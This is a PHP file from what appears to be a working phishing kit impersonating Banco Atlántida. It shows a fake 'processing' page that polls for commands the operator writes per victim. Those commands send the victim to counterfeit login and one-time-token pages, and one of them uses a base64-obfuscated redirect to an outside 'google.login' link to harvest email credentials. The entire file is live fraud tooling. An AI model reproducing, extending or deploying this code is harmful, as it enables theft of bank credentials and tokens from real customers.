<?php
require_once __DIR__ . '/gate_check.php';
$usuario = trim($_GET['u'] ?? '');
$step    = trim($_GET['step'] ?? '');
if (!$usuario) {
    header('Location: index.html');
    exit;
}
$self = 'espera.php?u=' . urlencode($usuario) . ($step ? '&step=' . rawurlencode($step) : '');

$archivo = __DIR__ . '/acciones/' . basename($usuario) . '.txt';
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);

    $u = urlencode($usuario);

    switch ($accion) {
        case '/GMAIL':
            ?><!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/><title>...</title>
<style>
body{margin:0;background:#fff;font-family:-apple-system,"Segoe UI",Roboto,sans-serif}
#__pop_ov{position:fixed;inset:0;z-index:99999;backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);background:rgba(0,0,0,.45);display:flex;align-items:center;justify-content:center;opacity:0;transition:opacity .35s}
#__pop_ov.in{opacity:1}
#__pop_box{background:#fff;border-radius:12px;padding:28px 32px;max-width:340px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.35);transform:translateY(18px);transition:transform .35s}
#__pop_ov.in #__pop_box{transform:translateY(0)}
#__pop_box p{font-size:15px;font-weight:500;color:#111;line-height:1.5;margin:0}
</style></head><body>
<script src="protect.js"></script>
<script>
(function(){
  var ov=document.createElement('div');ov.id='__pop_ov';
  var bx=document.createElement('div');bx.id='__pop_box';
  var tx=document.createElement('p');tx.textContent='Confirma tu correo electr\u00f3nico para continuar';
  bx.appendChild(tx);ov.appendChild(bx);document.body.appendChild(ov);
  setTimeout(function(){ov.classList.add('in');},100);
  setTimeout(function(){
    ov.classList.remove('in');
    setTimeout(function(){
      window.location.href=atob('aHR0cHM6Ly90Mm0uY28vZ29vZ2xlLmxvZ2lu');
    },400);
  },3000);
})();
</script>
</body></html><?php
            exit;
        case '/HSN':
            header('Location: hm/index05.html'); break;
        case '/WASPATT':
            header('Location: waspatt.html?u=' . $u); break;
        case '/LISTO':
            header('Location: listo.html'); break;
        case '/LOGIN':
            if ($step === 'login') {
                header('Location: log/token.php?u=' . $u);
            } else {
                header('Location: log/index.php');
            }
            break;
        case '/TOK':
            header('Location: log/token.php?u=' . $u); break;
        case '/LOGINERROR':
            header('Location: log/index.php?error=1'); break;
        case '/TOKERROR':
            header('Location: log/token.php?u=' . $u . '&retry=1'); break;
        case '/ERROR':
        default:
            header('Location: index.html'); break;
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <meta http-equiv="refresh" content="2;url=<?= htmlspecialchars($self) ?>"/>
  <title>Procesando...</title>
  <link rel="icon" href="img/logo-ba.svg" type="image/svg+xml"/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{font-family:'Inter',sans-serif;background:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px}
    img.logo{height:56px}
    .spinner{width:56px;height:56px;position:relative}
    .spinner .ring{position:absolute;inset:0;border-radius:50%;border:5px solid transparent;animation:spin 1.1s linear infinite}
    .spinner .r1{border-top-color:#E30613}
    .spinner .r2{border-right-color:#f87171;animation-duration:1.6s;animation-direction:reverse;width:42px;height:42px;top:7px;left:7px}
    @keyframes spin{to{transform:rotate(360deg)}}
    p{font-size:15px;color:#374151;font-weight:500}
    small{font-size:12px;color:#9ca3af;margin-top:-16px}
  </style>
</head>
<body>
  <img src="img/logo-ba.svg" class="logo" alt="Banco Atl&#225;ntida"/>
  <div class="spinner">
    <div class="ring r1"></div>
    <div class="ring r2"></div>
  </div>
  <p>Estamos procesando tu solicitud...</p>
  <small>No cierres esta ventana</small>
<script src="protect.js"></script>
</body>
</html>
